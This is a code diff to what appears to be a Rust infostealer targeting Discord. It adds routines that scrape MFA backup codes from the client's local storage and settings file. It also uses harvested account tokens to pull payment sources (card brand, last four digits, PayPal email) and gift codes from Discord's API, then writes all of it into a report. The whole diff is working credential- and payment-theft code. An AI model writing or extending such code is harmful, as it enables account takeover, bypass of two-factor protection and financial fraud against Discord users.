@@ -228,6 +228,80 @@ fn scan_bytes_for_tokens(buffer: &[u8]) -> Result<HashSet<String>, RecoveryError
     Ok(tokens)
 }
 
+fn scan_bytes_for_mfa_codes(buffer: &[u8]) -> HashSet<String> {
+    let mut codes = HashSet::new();
+    let mut cursor = 0;
+    while cursor + 8 <= buffer.len() {
+        let mut potential = true;
+        for i in 0..8 {
+            let b = buffer[cursor + i];
+            if !b.is_ascii_lowercase() && !b.is_ascii_digit() {
+                potential = false;
+                break;
+            }
+        }
+
+        if potential {
+            let prev = if cursor > 0 { buffer[cursor - 1] } else { b' ' };
+            let next = if cursor + 8 < buffer.len() {
+                buffer[cursor + 8]
+            } else {
+                b' '
+            };
+            let is_delim = |b: u8| {
+                b == b'"'
+                    || b == b'\''
+                    || b == b' '
+                    || b == b'\n'
+                    || b == b'\r'
+                    || b == b'\0'
+                    || b == b','
+            };
+            if is_delim(prev) && is_delim(next) {
+                if let Ok(code) = std::str::from_utf8(&buffer[cursor..cursor + 8]) {
+                    codes.insert(code.to_string());
+                }
+                cursor += 8;
+                continue;
+            }
+        }
+        cursor += 1;
+    }
+    codes
+}
+
+async fn collect_mfa_codes(proc_name: &str, root: &Path) -> Vec<String> {
+    let mut codes = HashSet::new();
+    let temp_dir = std::env::temp_dir().join("ixodes_discord_mfa_tmp");
+    let _ = fs::create_dir_all(&temp_dir).await;
+
+    let settings_path = root.join("settings.json");
+    if settings_path.exists() {
+        if let Ok(data) = read_safe(proc_name, &settings_path, &temp_dir).await {
+            codes.extend(scan_bytes_for_mfa_codes(&data));
+        }
+    }
+
+    let leveldb_dir = root.join("Local Storage").join("leveldb");
+    if leveldb_dir.exists() {
+        if let Ok(mut dir) = fs::read_dir(&leveldb_dir).await {
+            while let Ok(Some(entry)) = dir.next_entry().await {
+                let path = entry.path();
+                if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
+                    if ext == "ldb" || ext == "log" {
+                        if let Ok(data) = read_safe(proc_name, &path, &temp_dir).await {
+                            codes.extend(scan_bytes_for_mfa_codes(&data));
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    let _ = fs::remove_dir_all(&temp_dir).await;
+    codes.into_iter().collect()
+}
+
 async fn cached_discord_tokens(
     roots: &[(String, PathBuf)],
 ) -> Result<Arc<Vec<DiscordTokenRecord>>, RecoveryError> {
@@ -351,6 +425,30 @@ impl DiscordApiClient {
             Ok(None) => record.errors.push("guild endpoint unauthorized".into()),
             Err(err) => record.errors.push(err),
         }
+
+        match self
+            .request_discord_endpoint::<Vec<DiscordBillingSource>>(
+                &record.token,
+                "/users/@me/billing/payment-sources",
+            )
+            .await
+        {
+            Ok(Some(sources)) => record.billing_sources = sources,
+            Ok(None) => record.errors.push("billing endpoint unauthorized".into()),
+            Err(err) => record.errors.push(err),
+        }
+
+        match self
+            .request_discord_endpoint::<Vec<DiscordGiftCode>>(
+                &record.token,
+                "/users/@me/entitlements/gift-codes",
+            )
+            .await
+        {
+            Ok(Some(gifts)) => record.gift_codes = gifts,
+            Ok(None) => record.errors.push("gift codes endpoint unauthorized".into()),
+            Err(err) => record.errors.push(err),
+        }
     }
 
     async fn request_discord_endpoint<T>(
@@ -398,8 +496,15 @@ async fn collect_discord_profiles_inner(
             continue;
         }
 
-        let mut profile = DiscordProfileRecord::new(source, token);
+        let mut profile = DiscordProfileRecord::new(source.clone(), token);
         api.populate_record(&mut profile).await;
+
+        if let Some((proc_name, root_path)) =
+            roots.iter().find(|(_, r)| r.display().to_string() == source)
+        {
+            profile.mfa_backup_codes = collect_mfa_codes(proc_name, root_path).await;
+        }
+
         profiles.push(profile);
     }
 
@@ -434,6 +539,9 @@ struct DiscordProfileRecord {
     blocked_friends: Vec<String>,
     owned_servers: Vec<DiscordGuildSummary>,
     other_servers: Vec<DiscordGuildSummary>,
+    billing_sources: Vec<DiscordBillingSource>,
+    gift_codes: Vec<DiscordGiftCode>,
+    mfa_backup_codes: Vec<String>,
     errors: Vec<String>,
 }
 
@@ -447,9 +555,29 @@ impl DiscordProfileRecord {
             blocked_friends: Vec::new(),
             owned_servers: Vec::new(),
             other_servers: Vec::new(),
+            billing_sources: Vec::new(),
+            gift_codes: Vec::new(),
+            mfa_backup_codes: Vec::new(),
             errors: Vec::new(),
         }
     }
+}
+
+#[derive(Deserialize, Serialize)]
+struct DiscordBillingSource {
+    #[serde(rename = "type")]
+    kind: i32,
+    invalid: bool,
+    brand: Option<String>,
+    last_4: Option<String>,
+    email: Option<String>,
+}
+
+#[derive(Deserialize, Serialize)]
+struct DiscordGiftCode {
+    code: String,
+    #[serde(rename = "sku_id")]
+    sku_id: Option<String>,
 }
 
 #[derive(Deserialize)]
@@ -659,6 +787,46 @@ impl RecoveryTask for DiscordServiceTask {
                     locale,
                     bio,
                 ));
+
+                if !profile.billing_sources.is_empty() {
+                    user_builder.push_str("Billing Sources:\n");
+                    for source in &profile.billing_sources {
+                        let kind_str = match source.kind {
+                            1 => "Credit Card",
+                            2 => "PayPal",
+                            _ => "Other",
+                        };
+                        user_builder.push_str(&format!(
+                            "  Type: {}, Brand: {}, Last4: {}, Email: {}, Invalid: {}\n",
+                            kind_str,
+                            source.brand.as_deref().unwrap_or("N/A"),
+                            source.last_4.as_deref().unwrap_or("N/A"),
+                            source.email.as_deref().unwrap_or("N/A"),
+                            source.invalid
+                        ));
+                    }
+                    user_builder.push('\n');
+                }
+
+                if !profile.gift_codes.is_empty() {
+                    user_builder.push_str("Gift Codes:\n");
+                    for gift in &profile.gift_codes {
+                        user_builder.push_str(&format!(
+                            "  Code: {} (SKU: {})\n",
+                            gift.code,
+                            gift.sku_id.as_deref().unwrap_or("N/A")
+                        ));
+                    }
+                    user_builder.push('\n');
+                }
+
+                if !profile.mfa_backup_codes.is_empty() {
+                    user_builder.push_str("MFA Backup Codes:\n");
+                    for code in &profile.mfa_backup_codes {
+                        user_builder.push_str(&format!("  {}\n", code));
+                    }
+                    user_builder.push('\n');
+                }
 
                 if !profile.errors.is_empty() {
                     user_builder.push_str("Errors:\n");
